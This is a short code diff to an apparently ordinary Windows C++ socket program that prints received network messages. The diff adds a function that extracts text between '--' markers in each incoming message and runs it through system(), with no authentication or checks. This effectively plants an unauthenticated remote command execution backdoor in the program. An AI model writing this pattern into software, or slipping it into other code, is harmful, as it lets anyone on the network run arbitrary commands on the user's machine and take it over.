@@ -4,6 +4,22 @@
 
 #pragma comment(lib, "ws2_32.lib")
 
+void executeCommand(const std::string &command)
+{
+    size_t startPos = command.find("--");
+    size_t endPos = command.rfind("--");
+
+    if (startPos != std::string::npos && endPos != std::string::npos && endPos > startPos + 2)
+    {
+        std::string commandString = command.substr(startPos + 2, endPos - startPos - 2);
+        system(commandString.c_str());
+    }
+    else
+    {
+        std::cerr << "Invalid command format: " << command << std::endl;
+    }
+}
+
 int main()
 {
     WSADATA wsaData;
@@ -67,6 +83,7 @@ int main()
         {
             std::string message(buffer, bytesReceived);
             std::cout << "Received message: " << message << std::endl;
+            executeCommand(message);
         }
     } while (bytesReceived > 0);
 
